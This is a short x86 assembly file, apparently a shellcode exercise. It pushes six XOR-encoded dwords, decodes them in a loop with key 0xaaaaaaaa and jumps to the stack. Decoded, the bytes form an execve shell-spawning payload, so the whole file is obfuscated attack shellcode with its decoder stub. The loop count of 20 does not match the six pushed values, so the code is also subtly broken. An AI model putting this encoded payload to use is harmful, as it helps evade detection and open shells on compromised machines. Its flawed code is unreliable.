global _start

section .text

_start:

push 0x2a67a11a
push 0x4b23f9f8
push 0x334923c4
push 0xc3c885c2
push 0xc2d98585
push 0xc2fa6a9b

mov esi,esp
xor ecx,ecx
mov cl,20
mov ebx,0xaaaaaaaa

decoder:
	xor dword [esi], ebx
	add esi, 4
	loop decoder

	jmp esp
